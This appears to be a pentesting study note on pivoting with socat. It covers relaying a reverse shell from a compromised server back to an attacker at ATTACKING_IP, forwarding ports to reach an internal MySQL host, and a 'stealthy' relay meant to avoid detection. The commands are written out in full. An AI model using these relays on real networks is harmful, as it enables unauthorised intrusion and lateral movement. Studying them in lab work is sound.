## Reverse Shell Relay

![[Rev_port_relay.png]]

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box
- `sudo nc -lvnp 443`( Attacker machine)
- `./socat tcp-l:8000 tcp:ATTACKING\_IP:443 &` (Victim machine outside facing)

From here we can then create a reverse shell to the newly opened port 8000 on the compromised server.

![[2021-03-20_12-03.png]]

A brief explanation of the above command:

-   `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
-   `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING\_IP obviously needs to be filled in correctly for this to work.
-   `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

## Port Forwarding - Easy

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`


- This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. 
- The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection.
- Once again we use `&` to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.
- We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

## Port Forwarding - Stealthy

*Previous technique had a port open on victim machine which can be detected easily*
- First of all, on our own attacking machine, we issue the following command:
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.

- Next, on the compromised (outward facing server) relay server we execute this command:
`./socat tcp:ATTACKING\_IP:8001 tcp:TARGET\_IP:TARGET\_PORT,fork &`
This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server

*Recap*
-   The request goes to `127.0.0.1:8000`
-   Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
-   Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
